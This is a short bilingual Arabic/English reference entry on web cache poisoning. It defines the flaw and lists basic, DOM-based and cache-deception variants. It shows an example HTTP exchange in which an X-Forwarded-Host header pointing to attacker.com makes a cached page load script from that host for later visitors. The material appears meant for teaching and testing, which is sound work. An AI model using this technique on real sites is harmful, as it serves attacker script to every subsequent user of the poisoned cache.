تسميم الذاكرة المخبئية — تسميم الجماهير

Web Cache Poisoning — Poisoning the Masses

HIGH OWASP A06
AR

Web Cache Poisoning هي ثغرة متقدمة تحدث عندما يستطيع المهاجم التلاعب برؤوس الطلبات غير المحددة في مفتاح الذاكرة المخبئية (Unkeyed Headers) مثل X-Forwarded-Host، لجعل الخادم يولد استجابة ضارة ويقوم وسيط الـ Cache (مثل Cloudflare أو Akamai) بحفظها وتوزيعها لجميع الزوار اللاحقين.

EN

Web Cache Poisoning is an advanced vulnerability where an attacker manipulates unkeyed request headers (like X-Forwarded-Host) to force the server into caching a malicious response, which is then served by the CDNs (like Cloudflare or Akamai) to all subsequent users.

أنواع تسميم الكاش / Attack Types

Basic Cache Poisoning

التلاعب بالرؤوس (Headers) لحقن جافا سكريبت في الـ Cached page.

DOM-based Cache Poisoning

التلاعب بالـ Unkeyed headers لتغيير المتغيرات التي تقرأها جافا سكريبت بالـ DOM.

Cache Deception

خداع الـ Cache لحفظ ملفات المستخدمين الحساسة (مثل `/profile`) على أنها ملفات ثابتة (مثل `/profile.js`) لتسهيل قراءتها علناً.

أوامر واختبار الثغرة / Testing & HTTP Headers

يتم اختبار الثغرة بإرسال ترويسات مخصصة غير مفهرسة (Unkeyed) ومراقبة ما إذا كانت تنعكس في الاستجابة ويتم إرسال ترويسة X-Cache: HIT:

# طلب يحتوي على ترويسة خبيثة
GET /index.html HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# الاستجابة المخزنة التي تحتوي على كود خبيث
HTTP/1.1 200 OK
X-Cache: MISS
...
<script src="https://attacker.com/tracking.js"></script>

# عند إعادة إرسال الطلب بدون الترويسة الخبيثة، تعود نفس الاستجابة المخزنة
GET /index.html HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
X-Cache: HIT
...
<script src="https://attacker.com/tracking.js"></script>
